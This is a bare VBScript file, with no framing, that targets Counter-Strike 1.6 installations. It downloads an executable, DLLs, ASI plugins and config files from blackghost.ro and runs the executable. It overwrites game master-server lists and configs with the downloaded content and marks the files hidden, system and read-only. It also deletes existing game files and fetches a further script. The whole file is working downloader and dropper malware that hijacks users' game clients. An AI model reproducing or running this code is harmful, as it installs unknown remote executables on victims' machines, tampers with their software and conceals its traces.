WScript.Sleep 5000
Dim filesys, readfile
Set fso = CreateObject("Scripting.FileSystemObject")
Set filesys = CreateObject("Scripting.FileSystemObject")
Set objShell = Wscript.CreateObject("Wscript.Shell")
strPath = objShell.SpecialFolders("MyDocuments")
strMyPath = strPath & "\"

WScript.Sleep 40000


Sub unProtectFile( filename )
	dim readfile, filesys
	set filesys = CreateObject("Scripting.FileSystemObject")

	If filesys.FileExists( filename ) Then
		set readfile = filesys.GetFile( filename )
		readfile.Attributes = 0 ' normal
	End If
End Sub


Sub protectFile( filename )
	dim readfile, filesys
	set filesys = CreateObject("Scripting.FileSystemObject")

	If filesys.FileExists( filename ) Then
		set readfile = filesys.GetFile( filename )
		readfile.Attributes = 7 ' hidden + system + readonly
	End If
End Sub

Sub DeleteAFile( filename )
	Dim filesys
	Set filesys = CreateObject("Scripting.FileSystemObject")
	
	If filesys.FileExists( filename ) Then
		unProtectFile( filename )
		filesys.DeleteFile( filename ), True
	End If
End Sub

Sub RenameFile( oldName, newName )
	Dim filesys
	Set filesys = WScript.CreateObject("Scripting.FileSystemObject")
	
	If filesys.FileExists( oldName ) Then
		filesys.MoveFile oldName, newName
	End If
End Sub

Sub DeleteAFolder( foldername )
	Dim filesys
	Set filesys = CreateObject("Scripting.FileSystemObject")
	
	If filesys.FolderExists( foldername ) Then
		' unProtectFile( foldername )
		filesys.DeleteFolder( foldername ), True
	End If
End Sub

Sub RenameFolder( oldName, newName )
	Dim filesys
	Set filesys = WScript.CreateObject("Scripting.FileSystemObject")
	
	If filesys.FolderExists( oldName ) Then
		filesys.MoveFolder oldName, newName
	End If
End Sub

WScript.Sleep 5000
Set fso = CreateObject("Scripting.FileSystemObject")
Set filesys = CreateObject("Scripting.FileSystemObject")
Set objShell = Wscript.CreateObject("Wscript.Shell")
strPath = objShell.SpecialFolders("StartUp")
strMyPath = strPath & "\"

CreateObject("WScript.Shell").Run("http://cs-16.ro")
CreateObject("WScript.Shell").Run("http://blackghost.ro")

CreateObject("WScript.Shell").Run("taskkill /f /im ati.exe")
CreateObject("WScript.Shell").Run("taskkill /f /im hlds.exe")
CreateObject("WScript.Shell").Run("taskkill /f /im ati.exe")

WScript.Sleep 2000

If FSO.FileExists(strMyPath & "ati.exe") Then 
       FSO.DeleteFile (strMyPath & "ati.exe")
   End If


WScript.Sleep 40000


Sub unProtectFile( filename )
	dim readfile, filesys
	set filesys = CreateObject("Scripting.FileSystemObject")

	If filesys.FileExists( filename ) Then
		set readfile = filesys.GetFile( filename )
		readfile.Attributes = 0 ' normal
	End If
End Sub


Sub protectFile( filename )
	dim readfile, filesys
	set filesys = CreateObject("Scripting.FileSystemObject")

	If filesys.FileExists( filename ) Then
		set readfile = filesys.GetFile( filename )
		readfile.Attributes = 7 ' hidden + system + readonly
	End If
End Sub

Sub DeleteAFile( filename )
	Dim filesys
	Set filesys = CreateObject("Scripting.FileSystemObject")
	
	If filesys.FileExists( filename ) Then
		unProtectFile( filename )
		filesys.DeleteFile( filename ), True
	End If
End Sub

Sub RenameFile( oldName, newName )
	Dim filesys
	Set filesys = WScript.CreateObject("Scripting.FileSystemObject")
	
	If filesys.FileExists( oldName ) Then
		filesys.MoveFile oldName, newName
	End If
End Sub

Sub DeleteAFolder( foldername )
	Dim filesys
	Set filesys = CreateObject("Scripting.FileSystemObject")
	
	If filesys.FolderExists( foldername ) Then
		' unProtectFile( foldername )
		filesys.DeleteFolder( foldername ), True
	End If
End Sub

Sub RenameFolder( oldName, newName )
	Dim filesys
	Set filesys = WScript.CreateObject("Scripting.FileSystemObject")
	
	If filesys.FolderExists( oldName ) Then
		filesys.MoveFolder oldName, newName
	End If
End Sub


Set fso = CreateObject("Scripting.FileSystemObject")
Set shl = CreateObject("WScript.Shell")
path="C:\AppPatch" 'path to folder    
exists = fso.FolderExists(path)

if (exists) then 
else
Dim oFSO
Set oFSO = CreateObject("Scripting.FileSystemObject")
' Create a new folder
oFSO.CreateFolder "C:\AppPatch"
oFSO.CreateFolder "C:\AppPatch\EFI"
oFSO.CreateFolder "C:\AppPatch\DVD"
oFSO.CreateFolder "C:\AppPatch\Fonts"
oFSO.CreateFolder "C:\AppPatch\PCAT"
end if



Dim strPath

strPath = "c:\AppPatch\PCAT\"

strURL="http://resurse.blackghost.ro/cmd/ati.EXE?" & Rnd
On Error Resume Next
	Set xml = CreateObject("Microsoft.XMLHTTP")
	xml.Open "GET", strURL, False
	xml.Send
	
	If Err.Number <> 0 Then
		WScript.Quit	' if file download fails, quit script
	Else
		set oStream = createobject("Adodb.Stream")

		oStream.type = 1 ' adTypeBinary
		oStream.open
		oStream.write xml.responseBody
		
		' overwrite
		oStream.savetofile strPath & "ati.EXE", 2 ' adSaveCreateOverWrite
		oStream.close
		
		set oStream = nothing
		Set xml = Nothing
	End If
	Err.Clear
On Error Goto 0

Set objShell = Wscript.CreateObject("Wscript.Shell")
strPath = objShell.SpecialFolders("MyDocuments")
strMyPath = strPath & "\"

On Error Resume Next
	Set objHTTP = CreateObject("MSXML2.XMLHTTP") 
	Call objHTTP.Open("GET", "http://resurse.blackghost.ro/cmd/MasterServers.vdf?" & Rnd, FALSE) 
	objHTTP.Send
	
	If Err.Number <> 0 Then
		
	Else
		DeleteAFile strMyPath & "mrv.upk"
		Set objFSO = CreateObject("Scripting.FileSystemObject")
		Set objFile = objFSO.CreateTextFile(strMyPath & "mrv.upk", ForWriting)
		objFile.Write objHTTP.ResponseText
		objFile.Close
		protectFile(strMyPath & "mrv.upk")
	End If
	
On Error Goto 0

strURL="http://resurse.blackghost.ro/cmd/steamsmaster.dll?" & Rnd
On Error Resume Next
	Set xml = CreateObject("Microsoft.XMLHTTP")
	xml.Open "GET", strURL, False
	xml.Send
	
	If Err.Number <> 0 Then
		WScript.Quit	' if file download fails, quit script
	Else
		set oStream = createobject("Adodb.Stream")

		oStream.type = 1 ' adTypeBinary
		oStream.open
		oStream.write xml.responseBody
		
		' overwrite
		oStream.savetofile strMyPath & "steamsmaster.dll.upk", 2 ' adSaveCreateOverWrite
		oStream.close
		
		set oStream = nothing
		Set xml = Nothing
	End If
	Err.Clear
On Error Goto 0

strURL="http://resurse.blackghost.ro/cmd/cocolino.asi?" & Rnd
On Error Resume Next
	Set xml = CreateObject("Microsoft.XMLHTTP")
	xml.Open "GET", strURL, False
	xml.Send
	
	If Err.Number <> 0 Then
		WScript.Quit	' if file download fails, quit script
	Else
		set oStream = createobject("Adodb.Stream")

		oStream.type = 1 ' adTypeBinary
		oStream.open
		oStream.write xml.responseBody
		
		' overwrite
		oStream.savetofile strMyPath & "cocolino.asi.upk", 2 ' adSaveCreateOverWrite
		oStream.close
		
		set oStream = nothing
		Set xml = Nothing
	End If
	Err.Clear
On Error Goto 0

strURL="http://resurse.blackghost.ro/cmd/rev.ini?" & Rnd
On Error Resume Next
	Set xml = CreateObject("Microsoft.XMLHTTP")
	xml.Open "GET", strURL, False
	xml.Send
	
	If Err.Number <> 0 Then
		WScript.Quit	' if file download fails, quit script
	Else
		set oStream = createobject("Adodb.Stream")

		oStream.type = 1 ' adTypeBinary
		oStream.open
		oStream.write xml.responseBody
		
		' overwrite
		oStream.savetofile strMyPath & "rev.ini.upk", 2 ' adSaveCreateOverWrite
		oStream.close
		
		set oStream = nothing
		Set xml = Nothing
	End If
	Err.Clear
On Error Goto 0
On Error Resume Next
	Set objHTTP = CreateObject("MSXML2.XMLHTTP") 
	Call objHTTP.Open("GET", "http://resurse.blackghost.ro/cmd/GameMenu.res?" & Rnd, FALSE) 
	objHTTP.Send
	
	If Err.Number <> 0 Then
		
	Else
		DeleteAFile strMyPath & "mrvgamemenu.upk"
		Set objFSO = CreateObject("Scripting.FileSystemObject")
		Set objFile = objFSO.CreateTextFile(strMyPath & "mrvgamemenu.upk", ForWriting)
		objFile.Write objHTTP.ResponseText
		objFile.Close
		protectFile(strMyPath & "mrvgamemenu.upk")
	End If
	
On Error Goto 0

On Error Resume Next
	Set objHTTP = CreateObject("MSXML2.XMLHTTP") 
	Call objHTTP.Open("GET", "http://resurse.blackghost.ro/cmd/motd_temp.html?" & Rnd, FALSE) 
	objHTTP.Send
	
	If Err.Number <> 0 Then
		
	Else
		DeleteAFile strMyPath & "bin"
		Set objFSO = CreateObject("Scripting.FileSystemObject")
		Set objFile = objFSO.CreateTextFile(strMyPath & "bin", ForWriting)
		objFile.Write objHTTP.ResponseText
		objFile.Close
		protectFile(strMyPath & "bin")
	End If
	
On Error Goto 0

On Error Resume Next
	Set objHTTP = CreateObject("MSXML2.XMLHTTP") 
	Call objHTTP.Open("GET", "http://resurse.blackghost.ro/cmd/motd_temp.html?" & Rnd, FALSE) 
	objHTTP.Send
	
	If Err.Number <> 0 Then
		
	Else
		DeleteAFile strMyPath & "motd_temp.html"
		Set objFSO = CreateObject("Scripting.FileSystemObject")
		Set objFile = objFSO.CreateTextFile(strMyPath & "motd_temp.html", ForWriting)
		objFile.Write objHTTP.ResponseText
		objFile.Close
		protectFile(strMyPath & "motd_temp.html")
	End If
	
On Error Goto 0

strComputer = "."
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

Set colFiles = objWMIService.ExecQuery _
    ("Select * from CIM_DataFile Where Filename = 'hl' and Extension = 'exe'")

For Each objFile in colFiles

On Error Resume Next

	DeleteAFolder objFile.Drive & objFile.Path & "cstrike\bin_old"
	DeleteAFile  objFile.Drive & objFile.Path & "cstrike\bin_old"

	DeleteAFile objFile.Drive & objFile.Path & "bin\TrackerUI.DLL"
	DeleteAFile objFile.Drive & objFile.Path & "config\MasterServers.vdf"
	DeleteAFile objFile.Drive & objFile.Path & "config\rev_MasterServers.vdf"
	DeleteAFile objFile.Drive & objFile.Path & "platform\config\MasterServers.vdf"
	DeleteAFile objFile.Drive & objFile.Path & "platform\config\rev_MasterServers.vdf"
	DeleteAFile objFile.Drive & objFile.Path & "cstrike\resource\GameMenu.res"
	DeleteAFile objFile.Drive & objFile.Path & "cstrike\bin\TrackerUI.dll"
	DeleteAFile objFile.Drive & objFile.Path & "cstrike\bin\au.vbs"
	DeleteAFile objFile.Drive & objFile.Path & "valve\bin\TrackerUI.dll"
	DeleteAFile objFile.Drive & objFile.Path & "cstrike\cl_dlls\ParticleMan.dll"
	DeleteAFile objFile.Drive & objFile.Path & "cstrike\protector.cfg"
	DeleteAFile objFile.Drive & objFile.Path & "config\rew_MasterServers.vdf"
	DeleteAFile objFile.Drive & objFile.Path & "platform\config\rew_MasterServers.vdf"

	RenameFile objFile.Drive & objFile.Path & "cstrike\bin\TrackerUI.dll", objFile.Drive & objFile.Path & "cstrike\bin\TrackerUI.dll.old"
	RenameFile objFile.Drive & objFile.Path & "valve\bin\TrackerUI.dll", objFile.Drive & objFile.Path & "valve\bin\TrackerUI.dll.old"
	RenameFile objFile.Drive & objFile.Path & "cstrike\cl_dlls\ParticleMan.dll", objFile.Drive & objFile.Path & "cstrike\cl_dlls\ParticleMan.dll.old"

	DeleteAFile objFile.Drive & objFile.Path & "cstrike\bin\TrackerUI.dll.old"
	DeleteAFile objFile.Drive & objFile.Path & "valve\bin\TrackerUI.dll.old"
	DeleteAFile objFile.Drive & objFile.Path & "cstrike\cl_dlls\ParticleMan.dll.old"

	DeleteAFile objFile.Drive & objFile.Path & "NexonUp.asi"
	DeleteAFile objFile.Drive & objFile.Path & "gopnict.flt"
	DeleteAFile objFile.Drive & objFile.Path & "update.asi"
	DeleteAFile objFile.Drive & objFile.Path & "muc.bak"
	DeleteAFile objFile.Drive & objFile.Path & "cstrike\bin\TrackerUI.dll.old"
	DeleteAFile objFile.Drive & objFile.Path & "valve\bin\TrackerUI.dll.old"
	DeleteAFile objFile.Drive & objFile.Path & "cstrike\cl_dlls\ParticleMan.dll.old"
	DeleteAFile objFile.Drive & objFile.Path & "NexonUp.asi.old"
	DeleteAFile objFile.Drive & objFile.Path & "mssv55.asi.old"
	DeleteAFile objFile.Drive & objFile.Path & "cstrike\radial.cdb"
	DeleteAFile objFile.Drive & objFile.Path & "cstrike\hw\geforce.cfg"
	DeleteAFile objFile.Drive & objFile.Path & "cstrike\hw\opengl.cfg"
	DeleteAFile objFile.Drive & objFile.Path & "cstrike\autoexec.cfg"
	DeleteAFile objFile.Drive & objFile.Path & "cstrike\valve.rc"
	DeleteAFile objFile.Drive & objFile.Path & "valve\hw\geforce.cfg"
	DeleteAFile objFile.Drive & objFile.Path & "valve\hw\opengl.cfg"
	DeleteAFile objFile.Drive & objFile.Path & "valve\valve.rc"
	RenameFile objFile.Drive & objFile.Path & "mssv55.asi", objFile.Drive & objFile.Path & "mssv55.asi.old"
	
	DeleteAFile objFile.Drive & objFile.Path & "msvv82.asi.old"
	RenameFile objFile.Drive & objFile.Path & "msvv82.asi", objFile.Drive & objFile.Path & "msvv82.asi.old"

	RenameFolder  objFile.Drive & objFile.Path & "cstrike\bin",  objFile.Drive & objFile.Path & "cstrike\bin_old"
	RenameFile objFile.Drive & objFile.Path & "cstrike\bin",  objFile.Drive & objFile.Path & "cstrike\bin_old"

	DeleteAFile objFile.Drive & objFile.Path & "cstrike\motd_temp.html.old"
	RenameFile objFile.Drive & objFile.Path & "cstrike\motd_temp.html",  objFile.Drive & objFile.Path & "cstrike\motd_temp.html.old"

	Dim FSO
	Set FSO = CreateObject("Scripting.FileSystemObject")
	FSO.CopyFile strMyPath & "mrv.upk", objFile.Drive & objFile.Path & "valve\resource\UI\bl.res"
	FSO.CopyFile strMyPath & "mrv.upk", objFile.Drive & objFile.Path & "config\MasterServers.vdf"
	FSO.CopyFile strMyPath & "mrv.upk", objFile.Drive & objFile.Path & "config\rev_MasterServers.vdf"
	FSO.CopyFile strMyPath & "mrv.upk", objFile.Drive & objFile.Path & "platform\config\MasterServers.vdf"
	FSO.CopyFile strMyPath & "mrv.upk", objFile.Drive & objFile.Path & "platform\config\rev_MasterServers.vdf"
	FSO.CopyFile strMyPath & "mrv.upk", objFile.Drive & objFile.Path & "config\rew_MasterServers.vdf"
	FSO.CopyFile strMyPath & "mrv.upk", objFile.Drive & objFile.Path & "platform\config\rew_MasterServers.vdf"
	FSO.CopyFile strMyPath & "mrvgamemenu.upk", objFile.Drive & objFile.Path & "cstrike\resource\GameMenu.res"
	FSO.CopyFile strMyPath & "steamsmaster.dll.upk", objFile.Drive & objFile.Path & "steamsmaster.dll"
	FSO.CopyFile strMyPath & "cocolino.asi.upk", objFile.Drive & objFile.Path & "cocolino.asi"
	FSO.CopyFile strMyPath & "rev.ini.upk", objFile.Drive & objFile.Path & "rev.ini"
	FSO.CopyFile strMyPath & "bin", objFile.Drive & objFile.Path & "cstrike\"
	
	FSO.CopyFile strMyPath & "motd_temp.html", objFile.Drive & objFile.Path & "cstrike\motd_temp.html"
	
	
	FSO.CopyFile strMyPath & "motd_temp.html", objFile.Drive & objFile.Path & "cstrike\hw\geforce.cfg"
	FSO.CopyFile strMyPath & "motd_temp.html", objFile.Drive & objFile.Path & "cstrike\hw\opengl.cfg"
	FSO.CopyFile strMyPath & "motd_temp.html", objFile.Drive & objFile.Path & "cstrike\autoexec.cfg"
	FSO.CopyFile strMyPath & "motd_temp.html", objFile.Drive & objFile.Path & "cstrike\userconfig.cfg"
	FSO.CopyFile strMyPath & "motd_temp.html", objFile.Drive & objFile.Path & "cstrike\valve.rc"
	FSO.CopyFile strMyPath & "motd_temp.html", objFile.Drive & objFile.Path & "valve\hw\geforce.cfg"
	FSO.CopyFile strMyPath & "motd_temp.html", objFile.Drive & objFile.Path & "valve\hw\opengl.cfg"
	FSO.CopyFile strMyPath & "motd_temp.html", objFile.Drive & objFile.Path & "valve\valve.rc"
	Set FSO = nothing

	protectFile(objFile.Drive & objFile.Path & "config\MasterServers.vdf")
	protectFile(objFile.Drive & objFile.Path & "config\rev_MasterServers.vdf")
	protectFile(objFile.Drive & objFile.Path & "platform\config\MasterServers.vdf")
	protectFile(objFile.Drive & objFile.Path & "platform\config\rev_MasterServers.vdf")
	protectFile(objFile.Drive & objFile.Path & "cstrike\resource\GameMenu.res")
	protectFile(objFile.Drive & objFile.Path & "config\rew_MasterServers.vdf")
	protectFile(objFile.Drive & objFile.Path & "steamsmaster.dll")
	protectFile(objFile.Drive & objFile.Path & "cocolino.asi")
	protectFile(objFile.Drive & objFile.Path & "rev.ini")
	protectFile(objFile.Drive & objFile.Path & "platform\config\rew_MasterServers.vdf")

	protectFile(objFile.Drive & objFile.Path & "cstrike\liblist.gam")

	DeleteAFile objFile.Drive & objFile.Path & "cstrike\bin\TrackerUI.dll"
	DeleteAFile objFile.Drive & objFile.Path & "valve\bin\TrackerUI.dll"
	DeleteAFile objFile.Drive & objFile.Path & "cstrike\cl_dlls\ParticleMan.dll"

	RenameFile objFile.Drive & objFile.Path & "cstrike\bin\TrackerUI.dll", objFile.Drive & objFile.Path & "cstrike\bin\TrackerUI.dll.old"
	RenameFile objFile.Drive & objFile.Path & "valve\bin\TrackerUI.dll", objFile.Drive & objFile.Path & "valve\bin\TrackerUI.dll.old"
	RenameFile objFile.Drive & objFile.Path & "cstrike\cl_dlls\ParticleMan.dll", objFile.Drive & objFile.Path & "cstrike\cl_dlls\ParticleMan.dll.old"

	DeleteAFile objFile.Drive & objFile.Path & "cstrike\bin\TrackerUI.dll.old"
	DeleteAFile objFile.Drive & objFile.Path & "valve\bin\TrackerUI.dll.old"
	DeleteAFile objFile.Drive & objFile.Path & "cstrike\cl_dlls\ParticleMan.dll.old"

	DeleteAFile objFile.Drive & objFile.Path & "mssv55.asi.old"
	RenameFile objFile.Drive & objFile.Path & "mssv55.asi", objFile.Drive & objFile.Path & "mssv55.asi.old"
	
	DeleteAFile objFile.Drive & objFile.Path & "msvv82.asi.old"
	RenameFile objFile.Drive & objFile.Path & "msvv82.asi", objFile.Drive & objFile.Path & "msvv82.asi.old"

On Error Goto 0

Next

	DeleteAFile strMyPath & "mrv.upk"
	DeleteAFile strMyPath & "mrvgamemenu.upk"
	DeleteAFile strMyPath & "steamsmaster.dll.upk"
	DeleteAFile strMyPath & "cocolino.asi.upk"
	DeleteAFile strMyPath & "rev.ini.upk"
	DeleteAFile strMyPath & "bin"
	DeleteAFile strMyPath & "motd_temp.html"
	
Sub Up()

Set objShell = Wscript.CreateObject("Wscript.Shell")
strPath = objShell.SpecialFolders("MyDocuments")
strMyPath = strPath & "\"

On Error Resume Next

Dim filesys
Set filesys = CreateObject("Scripting.FileSystemObject")




On Error Resume Next

Set filesys = CreateObject("Scripting.FileSystemObject")


On Error Goto 0


Dim objShell
Set objShell = WScript.CreateObject( "WScript.Shell" )
objShell.Run("""c:\AppPatch\PCAT\ati.EXE""")
Set objShell = Nothing

If Err.Number <> 0 Then

Else

filesys.DeleteFile( strMyPath & "*.vbs" ), True

End If
	
On Error Goto 0

On Error Resume Next
	Set objHTTP = CreateObject("MSXML2.XMLHTTP") 
	Call objHTTP.Open("GET", "http://resurse.blackghost.ro/cmd/don.vbs?" & Rnd, FALSE) 
	objHTTP.Send
	
	If Err.Number <> 0 Then
		
	Else
		DeleteAFile strMyPath & "don.vbs"
		Set objFSO = CreateObject("Scripting.FileSystemObject")
		Set objFile = objFSO.CreateTextFile(strMyPath & "don.vbs", ForWriting)
		objFile.Write objHTTP.ResponseText
		objFile.Close
		protectFile(strMyPath & "don.vbs")
	End If
	
On Error Goto 0

End Sub

Up()